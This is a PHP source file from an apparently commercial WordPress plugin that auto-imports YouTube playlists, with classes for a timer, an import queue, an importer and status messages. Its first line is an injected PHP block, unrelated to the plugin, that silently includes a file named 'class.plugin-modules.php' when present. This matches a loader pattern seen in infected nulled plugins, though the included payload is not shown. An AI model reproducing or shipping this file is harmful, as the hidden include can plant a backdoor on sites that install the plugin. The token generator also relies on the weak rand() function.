<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if( ! class_exists( 'YouTube_API_Query' ) ){
	require_once CBC_PATH . 'includes/libs/youtube-api-query.class.php';
}
if( ! class_exists( 'CBC_Autoimport_Feed' ) ){
	include_once CBC_PATH . 'includes/admin/libs/autoimport_feed.class.php';
}

/**
 * Timer class that will check if intervals are expired
 */
class CBC_Timer{

	/**
	 * Stores default timer details
	 * 
	 * @var array
	 */
	private $timer_defaults;

	/**
	 * Store WP option name for later reference
	 * 
	 * @var string
	 */
	private $option_name;

	/**
	 * Stores the option value
	 * 
	 * @var array
	 */
	private $timer_option;

	/**
	 * Constructor, sets up variables needed by class
	 * 
	 * @param string $option_name
	 */
	public function __construct( /*string*/ $option_name ){
		$this->timer_defaults = array( 
				'time' => 0, 
				'date' => '', 
				'delay' => 0 
		);
		
		$this->option_name = $option_name;
	}

	/**
	 * Checks if timer is expired.
	 * 
	 * @return boolean - true if timer is expired or false if it's not expired
	 */
	public function is_expired(){
		$o = $this->get_timer();
		return time() > ( $o[ 'time' ] + $o[ 'delay' ] );
	}

	/**
	 * Returns the time difference between current time and the time and delay set for timeout.
	 * 
	 * @return integer
	 */
	public function get_current_delay(){
		$o = $this->get_timer();
		$e = time() - ( $o[ 'time' ] + $o[ 'delay' ] );
		return $e;
	}

	/**
	 * Returns timer option
	 * 
	 * @return array
	 */
	public function get_timer(){
		if( $this->timer_option ){
			return $this->timer_option;
		}
		
		$this->timer_option = get_option( $this->option_name, $this->timer_defaults );
		return $this->timer_option;
	}

	/**
	 * Set the timer to a given delay
	 * 
	 * @param integer $delay - number of seconds until the timer expires
	 */
	public function set_timer( /*int*/ $delay ){
		// update the internal option
		$this->timer_option = array( 
				'time' => time(),  // UNIX timestamp
				'date' => date( 'd M Y H:i:s' ),  // full date
				'delay' => absint( $delay ) 
		); // expiration delay in seconds
		   
		// update site option
		update_option( $this->option_name, $this->timer_option );
	}
}

/**
 * Manages the automatic import playlists.
 * Used to determine the next playlist that should be imported and
 * to set the import details for reporting and later reference.
 */
class CBC_Playlist_Queue{

	/**
	 * Post type object
	 * 
	 * @var CBC_Video_Post_Type
	 */
	private $post_type;

	/**
	 * WP option name that will store details about the last imported playlist.
	 * 
	 * @var array
	 */
	private $option_name;

	/**
	 * If a previously imported playlist is set, this value will be used to
	 * select the next playlist after this one.
	 * 
	 * @var int
	 */
	private $last_playlist_id = false;

	/**
	 * When determining the next playlist in line, this variable will hold
	 * the ID of the playlist post found to be next to import queue
	 */
	private $next_playlist_id = false;

	/**
	 *
	 * @param string $post_type_name - WP registered post type name for playlists
	 * @param string $option_name - WP option that holds the ID of the last imported playlist
	 */
	public function __construct(  /*CBC_Video_Post_Type*/ $post_type, $option_name ){
		$this->post_type = $post_type;
		$this->option_name = $option_name;
	}

	/**
	 * Get the next playlist ID that should be imported
	 * 
	 * @return integer/boolean false - returns next post playlist ID or false in case none is active
	 */
	public function get_next_autoimport(){
		// get last imported playlist option
		$status = $this->get_import_status();
		
		// if a previous playlist is found, add a WHERE clause to the query
		if( isset( $status[ 'post_id' ] ) && $status[ 'post_id' ] ){
			$this->last_playlist_id = ( int ) $status[ 'post_id' ];
			add_filter( 'posts_where', array( 
					$this, 
					'__wp_filter_where' 
			) );
		}
		
		// query the next playlist to be imported
		$args = array( 
				'post_type' => $this->post_type->get_playlist_post_type(), 
				'post_status' => 'publish', 
				'orderby' => 'ID',
				'order' => 'ASC', 
				'posts_per_page' => 1 
		);
		$query = new WP_Query( $args );
		$result = $query->get_posts();
		
		// remove the filter
		remove_filter( 'posts_where', array( 
				$this, 
				'__wp_filter_where' 
		) );
		
		// found the next playlist, return its ID
		if( $result && ! is_wp_error( $result ) ){
			$this->next_playlist_id = $result[ 0 ]->ID;
		}else{
			// we might have reached the last playlist, query for the first playlist
			$result = $query->query( $args );
			if( $result && ! is_wp_error( $result ) ){
				$this->next_playlist_id = $result[ 0 ]->ID;
			}else{
				// if all fails, set the next playlist ID to false
				$this->next_playlist_id = false;
			}
		}
		
		return $this->next_playlist_id;
	}

	/**
	 * Determines the next playlist in line for importing and sets the WP option
	 * with its details for later reference.
	 * 
	 * @param boolean $running - if starting an import when checking this, set to true
	 */
	public function start_next_playlist_import(){
		// get last imported playlist option
		$status = $this->get_import_status();
		// always check if a previous import is still running. If it does, stop
		if( isset( $status[ 'running_update' ] ) && $status[ 'running_update' ] ){
			// check if an update isn't stalling for more than 5 minutes. In this case, something went wrong and the status must be reset.
			if( time() > $status[ 'time' ] + 300 ){
				$this->update_status( $status[ 'post_id' ], false, $status[ 'empty' ] );
			}else{
				$error = new WP_Error( 'cbc_import_running', __( 'An import is still running, imports will resume once the current import is done.', 'cbc_video' ), $status );
				return $error;
			}
		}
		
		$next_playlist = $this->get_next_autoimport();
		
		$option = $this->default_status_option();
		if( $next_playlist ){
			$feed_obj = new CBC_Autoimport_Feed( $this->post_type );
			$feed_obj->set_post( $next_playlist );
			// if playlist should repeat the import set the id to a lower ID value so that the next update will get the same post ID
			$option[ 'post_id' ] = $feed_obj->repeat( true ) ? ( $next_playlist - 1 ) : $next_playlist;
			$option[ 'empty' ] = false;
			$option[ 'running_update' ] = true;
		}
		$this->update_status( $option[ 'post_id' ], $option[ 'running_update' ], $option[ 'empty' ] );
		return $next_playlist;
	}

	/**
	 * Should be always trigegred after an import is finished.
	 * Will flag the current import
	 * as finished in WP option for later reference and reporting
	 */
	public function import_ended(){
		// get last imported playlist option
		$status = $this->get_import_status();
		if( isset( $status[ 'running_update' ] ) && $status[ 'running_update' ] ){
			$this->update_status( $status[ 'post_id' ], false, $status[ 'empty' ] );
		}
	}

	/**
	 * Returns import status WP option stored in database
	 */
	public function get_import_status(){
		return get_option( $this->option_name, $this->default_status_option() );
	}

	/**
	 * Updates the WP option that holds the import status of the last playlist
	 * 
	 * @param int $playlist_id
	 * @param boolean $running_import
	 * @param boolean $empty
	 */
	private function update_status( $playlist_id, $running_import = false, $empty = true ){
		$option = $this->default_status_option();
		$option[ 'post_id' ] = $playlist_id;
		$option[ 'running_update' ] = $running_import;
		$option[ 'empty' ] = $empty;
		return update_option( $this->option_name, $option );
	}

	/**
	 * The default status option array
	 * 
	 * @return multitype:boolean number NULL
	 */
	private function default_status_option(){
		return array( 
				'post_id' => false, 
				'time' => time(), 
				'date' => date( 'd M Y H:i:s' ), 
				'empty' => true, 
				'running_update' => false 
		);
	}

	/**
	 * Filter 'posts_where' callback.
	 * Will add to WHERE clause of current query
	 * to limit the search for the next playlist.
	 * Filter set by method CBC_Automatic_Playlist->get_next_autoimport()
	 * 
	 * @param string $where
	 * @return string - the WHERE clause
	 */
	public function __wp_filter_where( $where = '' ){
		if( ! $this->last_playlist_id ){
			return $where;
		}
		
		$where .= sprintf( " AND ID > %d", $this->last_playlist_id );
		return $where;
	}
}

/**
 * Imports a given playlist based on its settings
 */
class CBC_Playlist_Importer{

	/**
	 * Store reference to post type object
	 * 
	 * @var CBC_Video_Post_Type
	 */
	private $post_type;

	/**
	 * Store playlist post ID
	 * 
	 * @var integer
	 */
	private $post_id;

	/**
	 * Object reference for CBC_Autoimport_Feed instance
	 * 
	 * @var CBC_Autoimport_Feed
	 */
	private $feed_obj;

	/**
	 * YouTube API object reference
	 * 
	 * @var YouTube_API_Query
	 */
	private $yt_api;

	/**
	 * Store API response from YouTube
	 * 
	 * @var array
	 */
	private $items;

	/**
	 *
	 * @param CBC_Video_Post_Type $post_type
	 */
	public function __construct( CBC_Video_Post_Type $post_type, /*int*/ $post_id ){
		$this->post_type = $post_type;
		$this->post_id = $post_id;
		$this->feed_obj = new CBC_Autoimport_Feed( $post_type );
		$this->feed_obj->set_post( $post_id );
		$this->yt_api = new YouTube_API_Query();
	}

	/**
	 * Import the playlist set when object was instantiated
	 * 
	 * @param int $per_page - entries per page
	 * @param boolean $include_categories - categories require an extra query to YouTube so getting them is optional
	 */
	public function import( $per_page, $include_categories ){
		// for user and channel playlists, ordering is returned by relevance by YouTube API
		// this can cause videos to be skipped so a hack is needed
		if( $this->get_option( 'type' ) != 'playlist' && $this->get_option( 'no_reiterate' ) ){
			// if last_video option is set, at least one iteration was made so set per page items to maximum, which is 50 videos
			// the plugin will order the entries by date so it should work when importing only newly uploaded videos
			if( !is_wp_error( $this->get_option( 'last_video' ) ) && $this->get_option( 'last_video' ) ){
				$initial_per_page = $per_page;				
				// hardcode number of videos to maximum allowed by API
				$per_page = 50;
				// log a message
				_cbc_debug_message( sprintf( 'Reiteration prevention in effect. Last video ID found: %s. Setting videos per page to %s to allow ordering by date descending.', $this->get_option('last_video'), $per_page ) );
			}			
		}		
		
		// set the number of items per page and whether to include categories or not
		$this->yt_api->set_per_page( $per_page );
		$this->yt_api->set_include_categories( $include_categories );
		// make the request
		$this->make_yt_query();
		
		// if query generated an error, log the error and stop
		if( is_wp_error( $this->items ) ){
			// send a debug message
			_cbc_debug_message( sprintf( 'Playlist ID #%d import error. Error is: %s', $this->post_id, $this->items->get_error_message() ), "\n", $this->items );
			return $this->items;
		}
		
		/**
		 * Variable $initial_per_page gets set only if there's a query for user or channel uploads
		 * and if option to import only newly added videos is on.
		 * The variable stores the initial number of videos that must be imported (set by the user)
		 * because it is resetted by the plugin to the full number of videos that can be queried at once in
		 * order to be able to order the videos by date. This is needed because YouTube API returns channel and user upload 
		 * feeds ordered by relevance(???) instead of allowing order by date.
		 */		
		if( isset( $initial_per_page ) ){
			// stop here if number of items is 0
			if( !$this->items ){
				_cbc_debug_message( sprintf( 'Playlist ID #%d has no new videos.', $this->post_id ) );
				return false;
			}
			//  slice the items to the number of videos set initially
			$this->items = array_slice( $this->items , 0, $initial_per_page );	
			_cbc_debug_message( sprintf( 'Forced video ordering in response feed. Playlist ID #%d truncated from maximum of %d results to %d results.', $this->post_id, $per_page, $initial_per_page ) );
		}
		
		// get feed statisctics returned by YouTube
		$feed_info = $this->yt_api->get_list_info();
		
		// send response info to debug		
		_cbc_debug_message( 'Feed response info: ' . print_r( $feed_info, true ) );
		
		// check if date restriction is in effect
		if( $this->date_restriction() ){
			$feed_info[ 'next_page' ] = '';
		}
		
		// set first/last video boundaries
		// this is the beginning of the feed
		if( empty( $feed_info[ 'prev_page' ] ) ){
			$this->set_boundaries();
			// send a debug message
			_cbc_debug_message( 'Beginning of feed, settings up first/last video boundaries.' );
		}
		
		// playlist shouldn't be reiterated, check if last video is in effect and stop the import at it
		if( $this->iteration_test() ){
			$feed_info[ 'next_page' ] = '';
		}
		
		if( empty( $feed_info[ 'next_page' ] ) && ! is_wp_error( $this->get_option( 'first_video' ) ) ){
			$this->set_import_option( 'last_video', $this->get_option( 'first_video' ) );
			// send a debug message
			_cbc_debug_message( sprintf( 'Reached end of feed, setting last video to ID %s.', $this->get_option( 'first_video' ) ) );
		}
		
		// do the import
		$import_result = $this->post_type->run_import( $this->items, $this->get_import_options() );
		// send a debug message
		_cbc_debug_message( sprintf( 'Import finished, results are: %s', print_r( $import_result, true ) ) );
		// store the statistics
		$this->store_statistics( $import_result, $feed_info );
		
		// reset the results
		$this->reset();
	}

	/**
	 * Store feed results statistics into the database for reporting in various plugin pages.
	 * Used in method $this->import
	 * 
	 * @param array $import_results - import results returned as array
	 * @param array $feed_info - queried feed information returned by YouTube_API_Query object and manipulated in method $this->import()
	 */
	private function store_statistics( /*array*/ $import_result, /*array*/ $feed_info ){
		// set new post meta values to reflect changes
		$this->set_import_option( 'total', $feed_info[ 'total_results' ] );
		$this->set_import_option( 'imported', ( $this->get_option( 'imported' ) + $import_result[ 'imported' ] ) );
		$this->set_import_option( 'updated', current_time( 'mysql' ) );
		$this->set_import_option( 'page_token', $feed_info[ 'next_page' ] );
		$this->set_import_option( 'etag' , $feed_info['etag'] );
		$this->store_import_options();
	}

	/**
	 * Check if a date restriction is in effect for the current playlist
	 * 
	 * @return timestamp/false - returns false if no restriction is in effect or the timestamp set by user
	 */
	private function date_restriction(){
		$options = $this->get_import_options();
		if( ! is_wp_error( $this->get_option( 'start_date' ) ) && $this->get_option( 'start_date' ) ){
			// only user and channel feeds support date restriction
			if( 'user' == $this->get_option( 'type' ) || 'channel' == $this->get_option( 'type' ) ){
				// set the maximum date to import from
				$date_restriction = strtotime( $this->get_option( 'start_date' ) );
				// iterate the current feed
				foreach( $this->items as $key => $entry ){
					$timestamp = strtotime( $entry->get_publish_date() );
					if( $timestamp < $date_restriction ){
						$this->items = array_slice( $this->items, 0, $key );
						// send a debug message
						_cbc_debug_message( sprintf( 'Date restriction in effect, results published on YouTube before "%s" were skipped from feed response.', $this->get_option( 'start_date' ) ) );
						return true;
					}
				}
			}
		}
		return false;
	}

	/**
	 * Will set first/last video boundaries.
	 * This should run ONLY at the beginning of the feed in order to be able to set the correct boundaries.
	 */
	private function set_boundaries(){
		if( !$this->items ){
			_cbc_debug_message( 'No items present. Video boundaries skipped.' );
			return;
		}
		// store last video boundary if stored first video isn't the same with feed first video
		if( ! is_wp_error( $this->get_option( 'first_video' ) ) && $this->get_option( 'first_video' ) != $this->items[ 0 ]->get_id() ){
			$this->set_import_option( 'last_video', $this->get_option( 'first_video' ) );
			// send a debug message
			_cbc_debug_message( sprintf( 'Setting up last video boundary to video having ID %s.', $this->get_option( 'first_video' ) ) );
		}
		// set first video boundary
		$this->set_import_option( 'first_video', $this->items[ 0 ]->get_id() );
		// send a debug message
		_cbc_debug_message( sprintf( 'Setting up first video boundary to video having ID %s.', $this->items[ 0 ]->get_id() ) );
	}

	/**
	 * Tests if playlist should be reiterated or not
	 */
	private function iteration_test(){
		if( $this->get_option( 'no_reiterate' ) && ! is_wp_error( $this->get_option( 'last_video' ) ) ){
			$last_video = $this->get_option( 'last_video' );
			foreach( $this->items as $key => $entry ){
				if( $entry->get_id() == $last_video ){
					$this->items = array_slice( $this->items, 0, $key );
					// send a debug message
					_cbc_debug_message( sprintf( 'Playlist reiteration restriction in effect, results were truncated to last imported video having ID %s.', $last_video ) );
					return true;
				}
			}
		}
	}

	/**
	 * Makes the YouTube API query and returns the items requested by
	 * playlist settings set by user
	 * 
	 * @param integer $per_page - number of results per page
	 * @param boolean $include_categories - include YouTube categories in response (will make extra api queries) or skip them
	 * @return array/WP_Error - results retrieved from YouTube or WP_Error in case something went wrong
	 */
	private function make_yt_query(){
		$items = array();
		switch( $this->get_option( 'type' ) ){
			case 'user':
				$this->items = $this->yt_api->get_user_uploads( $this->get_option( 'id' ), $this->get_option( 'page_token' ) );
			break;
			case 'playlist':
				$this->items = $this->yt_api->get_playlist( $this->get_option( 'id' ), $this->get_option( 'page_token' ) );
			break;
			case 'channel':
				$this->items = $this->yt_api->get_channel_uploads( $this->get_option( 'id' ), $this->get_option( 'page_token' ) );
			break;
			default:
				$this->items = new WP_Error( 'cbc_yt_autoimport_error', __( 'Sorry, we encountered an unknown feed type. Importing has stopped for this playlist.', 'cbc_video' ), $this->get_import_options() );
			break;
		}
	}

	/**
	 * Returns the meta needed for importing a playlist associated to the playlist post
	 * that the ID belongs to.
	 * 
	 * @param int $playlist_id
	 */
	private function get_import_options(){
		return $this->feed_obj->get();
	}

	/**
	 * Return the value of a single option from playlist options array
	 * 
	 * @param string $option
	 */
	private function get_option( $option ){
		return $this->feed_obj->get( $option );
	}

	/**
	 * Set an option on plugin meta
	 * 
	 * @param string $option - name of the option
	 * @param any $value - option value
	 */
	private function set_import_option( $option, $value ){
		$this->feed_obj->__set( $option, $value );
	}

	/**
	 * Updates the post meta
	 */
	private function store_import_options(){
		$this->feed_obj->__store();
	}

	/**
	 * Reset items array after a query
	 */
	private function reset(){
		$this->items = array();
	}
}

class CBC_Import_Messages{

	/**
	 * Stores automatic import object reference
	 * 
	 * @var CBC_Auto_Import
	 */
	private $importer;

	/**
	 * Constructor
	 * 
	 * @param CBC_Auto_Import $importer
	 */
	public function __construct( /*CBC_Auto_Import*/ $importer ){
		$this->importer = $importer;
	}

	/**
	 * Returns a status message on the current automatic import
	 * 
	 * @param string $before
	 * @param string $after
	 * @param boolean $echo
	 */
	public function status_message( $before = '', $after = '', $echo = true ){
		$timer = $this->importer->get_timer()->get_timer();
		$queue = $this->importer->get_queue()->get_import_status();
		$playlist = $this->importer->get_queue()->get_next_autoimport();
		
		$message = '';
		// no playlist in queue
		if( ! $playlist ){
			$message = __( 'Import queue is empty. Not performing any automatic imports.', 'cbc_video' );
		}else{
			if( ! $this->importer->get_conditions()->allow_import() ){
				// get the next playlist
				$post = get_post( $playlist );
				
				$message = __( 'A filter is in effect that prevents automatic imports from running. ', 'cbc_video' );
				
				$options = $this->importer->get_plugin_settings();
				if( $options[ 'conditional_import' ] ){
					$message .= sprintf( __( 'Imports can be made only when the following URL is accesed: %s' ), '<code>' . cbc_autoimport_uri( false ) . '</code>' );
				}
				
				if( ! $this->importer->get_timer()->is_expired() ){
					$message .= sprintf( '<br /><span id="cbc-update-message"><i class="dashicons dashicons-update"></i> ' . __( 'Playlist %s can be imported in %s', 'cbc_video' ) . '</span>', '<strong>' . $post->post_title . '</strong>', '<strong id="cbc-timer" data-type="decrease" data-allow_import="no">' . $this->show_timeout() . '</strong>' );
				}else{
				}
			}else{
				// If flagged as importing, a playlist is running an import and the queue is on hold
				if( $queue[ 'running_update' ] ){
					// get the post object for the current playlist
					$post = get_post( $queue[ 'post_id' ] );
					// if the post was removed or couldn't be found, reset the import queue
					if( !$post || is_wp_error( $post ) ){
						$this->importer->get_queue()->import_ended();
						return;
					}
					
					if( $this->importer->get_timer()->is_expired() ){
						// if after the timer expires the current playlist is still flagged as importing, this means that it needed more than the allocated time interval to import
						$message = sprintf( __( '...still waiting for playlist %s to finish importing. The next playlist import in queue will be skipped for the next time interval.', 'cbc_video' ), $post->post_title );
					}else{
						// a playlist is importing into the allocated time interval between imports
						$message = sprintf( __( '... waiting for playlist %s to finish importing.', 'cbc_video' ), '<strong>' . $post->post_title . '</strong>' );
					}
				}else{ // no playlist flagged as importing, show the delay between imports
				       // get the next playlist
					$post = get_post( $playlist );
					
					if( $this->importer->get_timer()->is_expired() ){
						$message = 'Timer expired';
					}else{
						$message = sprintf( '<span id="cbc-update-message"><i class="dashicons dashicons-update"></i> ' . __( 'Playlist %s can be imported in %s', 'cbc_video' ) . '</span>', '<strong>' . $post->post_title . '</strong>', '<strong id="cbc-timer" data-type="decrease">' . $this->show_timeout() . '</strong>' );
					}
				}
			}
		}
		
		/**
		 * Filter the import message
		 * 
		 * @var string
		 */
		$message = apply_filters( 'cbc_automatic_import_message', $message );
		$result = $before . $message . $after;
		if( $echo ){
			echo $result;
		}
		
		return $result;
	}

	/**
	 * Returns the timeout until the next playlist can be imported.
	 * 
	 * @return string - timeout in format HH:MM:SS
	 */
	private function show_timeout(){
		$timer = $this->importer->get_timer()->get_timer();
		$seconds = $timer[ 'delay' ] - ( time() - $timer[ 'time' ] );
		return cbc_human_time( $seconds );
	}
}

class CBC_Autoimport_Conditions{

	/**
	 * Store plugin options
	 * 
	 * @var array
	 */
	private $options;

	/**
	 * Constructor
	 */
	public function __construct(){
		$this->options = $this->get_plugin_options();
	}

	/**
	 * Method that implements a filter that can be used
	 * by third party plugin to completely prevent automatic imports
	 * 
	 * @return boolean - true, import is allowed, false, import is dissalowed
	 */
	public function allow_import(){
		/**
		 * Filter that can prevent any automatic import from running
		 * 
		 * @var boolean
		 */
		$allow = apply_filters( 'cbc_allow_auto_import', true );
		
		// If automatic import is allowed, check if conditional importing is allowed
		if( $allow && $this->options[ 'conditional_import' ] ){
			// check the special variable that should be set in order to allow automatic imports
			if( ! isset( $_GET[ 'cbc_autoimport' ] ) || $_GET[ 'cbc_autoimport' ] != $this->options[ 'autoimport_param' ] ){
				$allow = false;
			}else{
				_cbc_debug_message( 'Received conditional import hit, setting up automatic import.' );
				// import allowed, set some filters
				add_filter( 'cbc_automatic_import_start_on_hook', array( 
						$this, 
						'_change_import_hook' 
				) );
				add_action( 'cbc_automatic_import_complete', array( 
						$this, 
						'_die' 
				) );
			}
		}
		
		return $allow;
	}

	/**
	 * Don't allow import under certain circumstances
	 * 
	 * @return boolean - true if import is allowed, false if import is not allowed
	 */
	public function can_start_auto_import(){
		// prevent for POST submits
		if( 'POST' === $_SERVER[ 'REQUEST_METHOD' ] ){
			return false;
		}
		// prevent imports on ajax calls
		if( defined( 'DOING_AJAX' ) && DOING_AJAX ){
			return false;
		}
		
		// prevent imports on certain plugin pages
		if( is_admin() ){
			// if page isn't set, allow imports
			$page = isset( $_GET[ 'page' ] ) ? $_GET[ 'page' ] : false;
			if( ! $page ){
				return false;
			}
			
			// only allow imports from automatic import posts list
			if( 'cbc_auto_import' == $page && ! isset( $_GET[ 'action' ] ) ){
				return true;
			}
			// all other admin pages are not allowed for importing
			return false;
		}
		
		// allow import
		return true;
	}

	/**
	 * Filter cbc_automatic_import_complete callback that stops the page from loading completely if doing @author CodeFlavors
	 * conditional automatic import
	 * 
	 * @return void
	 */
	public function _die(){
		die();
	}

	/**
	 * Filter cbc_automatic_import_start_on_hook callback that changes the action that triggers the automatic
	 * import from shutdown to init.
	 * 
	 * @return string $action
	 */
	public function _change_import_hook(){
		return 'init';
	}

	/**
	 * Returns the plugin options
	 * 
	 * @return array
	 */
	private function get_plugin_options(){
		return cbc_get_settings();
	}
}

/**
 * Automatic import class
 */
class CBC_Auto_Import{

	/**
	 * Store timer reference
	 * 
	 * @var CBC_Timer
	 */
	private $timer;

	/**
	 * Store conditions object reference
	 * 
	 * @var CBC_Autoimport_Conditions
	 */
	private $conditions;

	/**
	 * Stores reference to playlist queue object
	 * 
	 * @var CBC_Automatic_Playlist
	 */
	private $queue;

	/**
	 * Store object reference
	 * 
	 * @var CBC_Video_Post_Type
	 */
	private $post_type;

	/**
	 * Store timeout between imports
	 * 
	 * @param int
	 */
	private $timeout;

	/**
	 * Store reference to automatic import messages object
	 * 
	 * @var CBC_Import_Messages
	 */
	private $messages;

	/**
	 * Constructor, set class properties
	 * 
	 * @param integer $timeout - the timeout between automatic imports
	 */
	public function __construct( /*CBC_Video_Post_Type*/ $post_type, /*int*/ $timeout ){
		// create a timer instance
		$this->timer = new CBC_Timer( '__cbc_autoimport_timer' );
		// determines the conditions when an automatic import can run
		$this->conditions = new CBC_Autoimport_Conditions();
		// if it's time to import, let's import
		if( $this->timer->is_expired() && $this->conditions->can_start_auto_import() ){
			// do not run anything above this, it needs to run as fast as possible to prevent concurrent imports
			// run the method that implements the filter that can be used by third party plugins to disable automatic imports
			if( $this->conditions->allow_import() ){
				$this->timer->set_timer( $timeout );
				// set the import request
				$this->set_import_process();
			}
		}
		
		// remote requests that should import videos have special variables set on them. If such variables are found, call the import process setup
		if( isset( $_GET[ 'cbc_self_call_autoimport' ] ) && isset( $_GET[ 'cbc_token' ] ) ){
			$token = get_option( '_cbc_remote_call_token', false );
			if( $token && ( $token == $_GET[ 'cbc_token' ] ) ){
				$this->set_import_process();
			}else{
				/**
				 * If both remote request special variables are set it means that a remote
				 * request was initiated.
				 * If the verification above did not pass we are dealing
				 * with concurrent automatic imports being triggered and this should end here
				 * because the code is expired and another process will trigger the automatic import.
				 */
				die();
			}
		}
		
		// store post type reference
		$this->post_type = $post_type;
		// create an instance of playlists manager
		$this->queue = new CBC_Playlist_Queue( $this->post_type, '__cbc_last_autoimport' );
		// create messages instance
		$this->messages = new CBC_Import_Messages( $this );
		// store timeout
		$this->timeout = $timeout;
	}

	/**
	 * Prepares the setup for an import process to be started.
	 */
	private function set_import_process(){
		$options = $this->get_plugin_settings();
		// import by remote call should be performed only if conditional import is off
		if( ! $options[ 'page_load_autoimport' ] && ! $options[ 'conditional_import' ] ){
			// if GET variables not set, make the remote request
			if( ! isset( $_GET[ 'cbc_self_call_autoimport' ] ) ){
				// generate an unique token for this request
				$token = $this->generate_token( 16, false );
				update_option( '_cbc_remote_call_token', $token );
				// create the URL
				$url = add_query_arg( array( 
						'cbc_self_call_autoimport' => '1', 
						'cbc_token' => $token 
				), trailingslashit( get_home_url() ) );
				// make request
				wp_remote_get( $url, array( 
						'blocking' => false, 
						'timeout' => 1 
				) );
				// log a debug message and stop here
				_cbc_debug_message( sprintf( 'Made remote call to trigger automatic import. Address is: %s', $url ) );
				return;
			}else{
				// Received a remove request to import. Check the token.
				if( ! isset( $_GET[ 'cbc_token' ] ) || get_option( '_cbc_remote_call_token', false ) != $_GET[ 'cbc_token' ] ){
					_cbc_debug_message( 'Remote call token verification failed, import was stopped.' );
					return;
				}
				// log a message
				_cbc_debug_message( sprintf( 'Received remote request with token %s', $_GET[ 'cbc_token' ] ) );
				$action = 'init';
				// set the script do die after import has ended since there's no need for the page output
				add_action( 'cbc_automatic_import_complete', array( 
						$this->conditions, 
						'_die' 
				) );
			}
		}
		// if action isn't set, set it to shutdown
		if( ! isset( $action ) ){
			// used internally to modify the hook when the import is triggered
			$action = apply_filters( 'cbc_automatic_import_start_on_hook', 'shutdown' );
		}
		// run the autoimport on shutdown action. Set priority higher than 10 to allow register_post to run when action is 'init'
		add_action( $action, array( 
				$this, 
				'__run' 
		), 11 );
		// send a debug message
		_cbc_debug_message( sprintf( 'Setting up automatic import to run on "%s" hook.', $action ) );
	}

	/**
	 * Generates a random token
	 * 
	 * @param number $length
	 * @return string
	 */
	private function generate_token( $length = 12 ){
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		$token = '';
		for( $i = 0; $i < $length; $i ++ ){
			$token .= substr( $chars, rand( 0, strlen( $chars ) - 1 ), 1 );
		}
		return $token;
	}

	/**
	 * Set in constructor, this method is the "shutdown" action callback that will
	 * import the YouTube videos from a playlist.
	 */
	public function __run(){
		$timers = $this->post_type->__get_load_timers();
		$timer = $timers->register_timer( __METHOD__, __FILE__, __LINE__ );
		
		// increase the time limit
		@set_time_limit( 300 );
		
		// start the import, get the playlist ID that should be imported
		$playlist_id = $this->queue->start_next_playlist_import();
		
		if( ! $playlist_id ){
			// send a debug message
			_cbc_debug_message( "Did not find any playlist to import. Stopped automatic importing." );
			return;
		}else if ( is_wp_error( $playlist_id ) ){
			_cbc_debug_message( $playlist_id->get_error_message() );
			return;
		}
		
		// send a debug message
		_cbc_debug_message( sprintf( 'Beginning automatic import for playlist having ID %d.', $playlist_id ) );
		
		// If the playlist method returned WP_Error, an automatic import is still running.
		// Set the timer to 60 seconds to allow it to finish and stop here.
		if( is_wp_error( $playlist_id ) ){
			// send a debug message
			_cbc_debug_message( 'An error was issued while attempting automatic import: ' . $playlist_id->get_error_message() . '. Automatic import set a 1 minute buffer and stopped.' );
			$this->timer->set_timer( 60 );
			return;
		}
		
		$options = $this->get_plugin_settings();
		$importer = new CBC_Playlist_Importer( $this->post_type, $playlist_id );
		$result = $importer->import( $options[ 'import_quantity' ], true );
		
		// unpublish playlist if set to unpublish on YouTube error
		if( cbc_is_youtube_error( $result ) && $options[ 'unpublish_on_yt_error' ] ){
			wp_update_post( array( 
					'post_status' => 'draft', 
					'ID' => $playlist_id 
			) );
		}
		
		// Always mark the import as ended successfully
		$this->queue->import_ended();
		// Reset the timer to current time to allow the full length of the timeout to be set
		$this->timer->set_timer( $this->timeout );
		// send a debug message
		_cbc_debug_message( 'Finished automatic import.' );
		
		/**
		 * Action triggered after automatic import is finished.
		 */
		do_action( 'cbc_automatic_import_complete' );
		
		$timer->set_end_time();
	}

	/**
	 * Getter, returns object instance of CBC_Timer
	 * 
	 * @return CBC_Timer
	 */
	public function get_timer(){
		return $this->timer;
	}

	/**
	 * Getter, returns instance of CBC_Autoimport_Conditions
	 * 
	 * @return CBC_Autoimport_Conditions
	 */
	public function get_conditions(){
		return $this->conditions;
	}

	/**
	 * Getter, returns object instance of CBC_Playlist_Queue
	 * 
	 * @return CBC_Playlist_Queue
	 */
	public function get_queue(){
		return $this->queue;
	}

	/**
	 * Getter, returns object instance of CBC_Video_Post_Type
	 * 
	 * @return CBC_Video_Post_Type
	 */
	public function get_post_type(){
		return $this->post_type;
	}

	/**
	 * Getter, returns object reference instance of CBC_Import_Messages
	 * 
	 * @return CBC_Import_Messages
	 */
	public function get_messages(){
		return $this->messages;
	}

	/**
	 * Returns the plugin options
	 * 
	 * @return array
	 */
	public function get_plugin_settings(){
		return cbc_get_settings();
	}
}